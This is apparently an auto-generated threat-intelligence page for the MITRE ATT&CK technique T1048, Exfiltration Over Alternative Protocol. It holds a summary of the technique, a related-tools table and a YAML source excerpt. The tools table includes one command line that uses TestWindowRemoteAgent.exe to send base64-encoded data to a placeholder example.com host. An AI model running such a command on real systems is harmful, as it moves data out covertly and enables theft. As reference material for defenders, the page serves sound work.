---
parsed_by: focuslocust
source: mitre
type: generated
---
# T1048 - Exfiltration Over Alternative Protocol

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1048` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.

Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.

## Related Tools

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [AADInternals](../../tools/unknown/aadinternals.md) | explicit | source | [AADInternals](https://attack.mitre.org/software/S0677) can directly download cloud user data such as OneDrive files.(Citation: AADInternals Documentation) |
| [TestWindowRemoteAgent.exe](../../tools/windows/testwindowremoteagent.exe.md) | explicit | source | Command metadata lists T1048: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000 |

## Source Verification

[source record](../../sources/mitre/exfiltration-over-alternative-protocol.md)

## Evidence Excerpt

```text
created: '2017-05-31T21:30:44.720Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and\
\ control channel. The data may also be sent to an alternate network location from the main command and control server.\
\  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main\
\ command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration\
\ Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system\
\ utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS\
```
